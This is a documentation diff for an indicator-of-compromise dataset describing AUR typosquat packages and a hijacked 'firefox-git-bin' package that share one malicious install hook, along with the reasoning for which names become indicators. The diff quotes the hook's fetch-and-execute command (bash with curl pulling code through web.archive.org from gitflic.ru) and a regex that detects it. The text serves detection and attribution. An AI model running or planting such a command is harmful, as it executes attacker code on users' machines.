@@ -86,3 +86,29 @@ that appear in community compromise lists:
 The AUR package names themselves are kept out of the IOC layer entirely: they
 were remediated, so a `package` entry on them would flag a cleaned-up package
 forever. They live, as an exposure reference only, under `data/aur-compromised/`.
+
+`aur-typosquat-2026-10.json` covers the two typosquat waves the watcher flagged
+on 2026-10-14 - fifteen names around `yay` and fourteen around
+`brave-beta-bin`, sharing one malicious `<pkg>.install` carrier (`sha256`
+`4b46e737…b75d`) that runs
+`bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/…' 2>/dev/null)`.
+The package cluster here is attacker-**created**, not hijacked, so a `package`
+entry is correct where the Atomic-Arch names were not: these names have no
+legitimate history to revert to. Two deliberate choices:
+
+- `firefox-git-bin` is **excluded as a `package` indicator although it was
+  compromised**, not because it is clean. It is a long-standing legitimate
+  package (maintainer `VitalyR`, Mozilla's release signing key) that the
+  attacker *hijacked*: the recipe is byte-intact and the payload was appended to
+  its pre-existing `firefox-git-bin.install` (199 bytes, `sha256`
+  `4b46e737…b75d`, byte-identical to the carriers above). Like the Atomic-Arch
+  names it is remediated, so a `package` entry would flag a cleaned-up package
+  forever; the `hash` indicator below already covers this hook. Its presence in
+  the brave cluster is a *true* positive of the adoption-window correlation (the
+  attacker took maintainership of it alongside the clones), not a heuristic
+  miss.
+- The archival-indirection `pkgbuild_pattern` is pinned to the embedded host
+  (`web\.archive\.org/web/\S*gitflic\.ru`) rather than to any archive URL that
+  embeds a second one. A host-agnostic shape would flag every PKGBUILD that
+  legitimately fetches a vanished upstream through `web.archive.org`; an IOC is
+  incident attribution, so it names what this campaign actually used.
